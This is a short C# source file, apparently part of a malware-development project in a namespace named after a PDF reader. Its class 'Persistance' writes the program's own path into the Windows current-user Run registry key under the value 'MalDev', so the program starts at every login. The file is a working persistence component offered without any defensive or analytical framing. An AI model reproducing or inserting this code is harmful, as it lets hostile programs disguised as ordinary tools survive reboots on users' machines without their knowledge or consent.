using System;

// dotnet add package Microsoft.Win32.Registry

namespace Winpdfreader;

public class Persistance
{
    GeneralInfo newInstance;

    public void AddToStartup()
    {
        Microsoft.Win32.RegistryKey rkInstance =
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
        rkInstance.SetValue("MalDev", newInstance.ePath);
        rkInstance.Dispose();
        rkInstance.Close();
        Console.WriteLine(newInstance.ePath);
    }

    public Persistance(GeneralInfo instance)
    {
        newInstance = instance;
    }
}